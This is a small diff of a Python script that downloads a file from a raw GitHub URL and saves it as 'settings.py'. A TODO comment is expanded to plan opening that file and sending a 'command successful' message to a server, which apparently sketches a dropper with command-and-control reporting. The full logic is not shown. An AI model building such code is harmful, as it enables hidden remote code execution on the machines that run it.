@@ -6,7 +6,7 @@ from os.path import exists
 url = 'https://raw.githubusercontent.com/LifeIsACage/soc_project/main/py_to_download.py'
 file_name = 'settings.py'
 
-#TODO - Open py file
+#TODO - Open py file and send a command succesfull message to the server
 
 def start_downloading():
     th1=Thread(target=download_code)
